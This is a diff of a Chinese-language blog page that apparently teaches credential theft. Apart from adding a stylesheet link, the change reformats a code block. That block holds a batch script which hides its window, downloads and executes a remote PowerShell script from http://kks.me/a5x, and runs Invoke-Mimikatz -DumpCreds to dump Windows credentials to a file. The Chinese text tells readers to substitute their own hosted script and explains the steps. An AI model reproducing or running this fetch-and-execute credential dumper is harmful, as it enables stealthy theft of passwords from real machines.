@@ -286,7 +286,7 @@
             <audio id="bgm" autoplay="autoplay" loop="loop" src="https://cache-1253916356.file.myqcloud.com/Black%20Lab%20-%20This%20Night.mp3"></audio>
         
     
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 
     
@@ -536,8 +536,11 @@
 <ul>
 <li>编写bat脚本,第四行的链接地址应为你自己存放ps1脚本的地址</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">if not &quot;%~1&quot;==&quot;p&quot; start /min cmd.exe /c %0 p&amp;exit</div><div class="line">cd /d %~dp0</div><div class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://kks.me/a5x&apos;); Invoke-Mimikatz -DumpCreds&quot;&gt;&gt;1.txt</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>@echo off
+if not &quot;%~1&quot;==&quot;p&quot; start /min cmd.exe /c %0 p&amp;exit
+cd /d %~dp0
+powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://kks.me/a5x&#39;); Invoke-Mimikatz -DumpCreds&quot;&gt;&gt;1.txt
+</code></pre><ul>
 <li>@echo off 不回显</li>
 <li>最小化批处理进程</li>
 <li>切换到脚本路径</li>
